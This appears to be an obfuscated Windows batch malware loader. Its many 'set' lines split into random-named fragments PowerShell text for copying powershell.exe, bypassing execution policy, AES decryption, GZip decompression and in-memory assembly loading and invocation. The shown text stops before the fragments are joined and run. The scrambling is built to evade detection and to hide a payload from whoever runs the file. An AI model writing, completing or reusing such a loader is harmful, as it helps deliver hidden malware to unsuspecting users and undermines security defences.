@echo off
set "EWKbWpGSDi=ow"
set "VlCvDsueOs=ws"
set "gKkNCkHDjE=1."
set "rWrRImZCie=32"
set "nlHovkyZaq=xe"
set "AZXTGKfqSl=s\"
set "syTXDtdYcS=po"
set "tZOqbpCwBe=he"
set "ADdJtzssBr=ll"
set "WVGihXfzgV=Po"
set "wxZCRPEfgu=:\"
set "qYrwxPxRPs=co"
set "jwTkTmCviZ=we"
set "FrLIGbZaFA=y "
set "hvrYxDpWpT=.e"
set "PZVPoiOftw=\v"
set "YffYcioSTv= /"
set "ROjXIJfRqN=rs"
set "gJAqdmdOfI=ll"
set "kjEJbGcjEC=do"
set "vhekFgXLdL=\W"
set "AyouyUGKTe=em"
set "WuQSLNdDJY=in"
set "CubmPUOLzZ=st"
set "JgTeyALyhp=0\"
set "RyNwpgqSDZ=Wi"
set "MFuuYfeenx=py"
set "UEDAPxmkdU=nd"
set "lrXhTRTyNt=Sy"
set "dOhAPKRvot=rS"
set "AwceYPspgj=we"
set "jTMhsCkBhN= C"
set "xqYddHRnki=he"
set "zdnMsDadHE= %~dp0"
set "LmQFUAoNio=cd"
set "oMkdGnqxZE===')"
set "OSJwcMAPOX=ring"
set "cCQcCqVMPE=dlM "
set "hMwHHmrNOP=ay()"
set "BBqKzuqais=$foX"
set "LDWbVVngUh=zm83"
set "RjXFSknakg=in $"
set "XvfmcDSrBP=rity"
set "VGnKwEHAGU=-joi"
set "EXTOFRTCcr=Stre"
set "uGnooTPRGx=.GZi"
set "QrSPzrZstQ=ddin"
set "IebHLXmplb=Disp"
set "vvLvtfdEey=pose"
set "tPFjyYricZ=th('"
set "TGoZALzHhg=urit"
set "vLnuwlaNEX=$OWB"
set "VitMLwuyrD=)))"
set "aFZBgLEvtx=-Obj"
set "KfjnsGQxmP=).Sp"
set "lCBJQNhzNs== [S"
set "BNQwNDaMpg=wN);"
set "nAWrrtcUJc=rity"
set "pqikPjNrmo=c = "
set "MOLIEKGlqU=m.IO"
set "akhCOhzowz=pStr"
set "hnDtdniFgh=tem."
set "sqSUEzXOJn=stem"
set "yYluJPKmMd=Invo"
set "rbAfTjGhiA=ach "
set "eDXhpHpDhM=('da"
set "VTWDhqbQOL=$bFI"
set "RzGhqcKqXX=lit("
set "xGQyqBgtEQ=BdBy"
set "ocFHNfrTNN=tryP"
set "yzrkxOccPj=);$Y"
set "ZxuQjkeTOj=ewLi"
set "vSMSRqGtXd= '')"
set "RLytvgVmXp= [Sy"
set "CXLrodHSak=();$"
set "rdBlVSiZrB=WBDj"
set "wzIlARgwTi=TllA"
set "wqbnlZLcuq=8kuY"
set "LRHRSwDflr='[-1"
set "VTUJbgCbuU=Wyqo"
set "XIVLrQOhac=-ep "
set "IvByvKpYlD=..-1"
set "rYwnSigwZq=[IO."
set "LhtXRWQBZH==');"
set "DwebyUfCAU=$bFI"
set "zvahJyViKp=.Con"
set "dYnbssQTPi=-joi"
set "FHuNshRXjS=iron"
set "eNXBAnFVtm=7kGw"
set "szrCFxTmTD=Bmor"
set "GBfoYRnTNr=sion"
set "GTjnWGYqzn=WCM "
set "MchaaFBOfc=brea"
set "DGqrTWRJXh=.Dis"
set "wKhevexzQL=dV1k"
set "lNgeqMDXHj=ne);"
set "ZQVSOcswmw=.Mod"
set "kArrAWfuHr=.Len"
set "ohKuJhOdse=XBh."
set "GKWMTAfdIH=y.Pa"
set "XSpSJeZCVt=.Sec"
set "PSRMgumJDG=foXB"
set "svfzaicZIt=V = "
set "aVNSvWmAUK=form"
set "CSeuZJvwxA=yste"
set "tiQPrpcPai=ing("
set "JovNvMuHwe=oin "
set "KUehMmrDmr=ionM"
set "wdOxTGIREz=lM.T"
set "NkXoNQitIs=.Ass"
set "nbkCzyykiC= '')"
set "OmYzTJxicu=WCM."
set "pylYnBosih='')("
set "hNZaZkvCha=vert"
